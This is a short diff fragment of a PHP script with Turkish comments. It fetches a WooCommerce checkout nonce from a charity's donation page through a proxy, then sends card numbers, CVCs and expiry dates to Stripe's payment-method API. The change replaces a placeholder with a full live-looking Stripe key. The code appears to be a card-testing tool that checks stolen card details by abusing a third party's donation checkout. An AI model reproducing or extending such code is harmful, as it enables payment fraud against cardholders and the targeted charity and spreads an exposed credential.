@@ -74,7 +74,7 @@ $page = request("https://forcesforchange.org/donate/", null, $proxy_url, $proxy_
 preg_match('/name="woocommerce-process-checkout-nonce" value="([^"]+)"/', $page, $nonce);
 
 // 2. Adım: Stripe Token (Kendi PK anahtarınızı kullanın)
-$stripe_post = "type=card&card[number]=$n&card[cvc]=$c&card[exp_month]=$m&card[exp_year]=$y&key=pk_live_xxxx...";
+$stripe_post = "type=card&card[number]=$n&card[cvc]=$c&card[exp_month]=$m&card[exp_year]=$y&key=pk_live_51RJd5fGlfOdBh4Nl2YUzFnY6zYb5IEAkHYSatP353K0wRioIydSEkrKfWMrApQmyNrPafBOqLy4KQ4a5O3aVODi500IGgjyNG6";
 $stripe_res = request("https://api.stripe.com/v1/payment_methods", $stripe_post, $proxy_url, $proxy_auth);
 $json_stripe = json_decode($stripe_res, true);
 $pm_id = $json_stripe['id'];
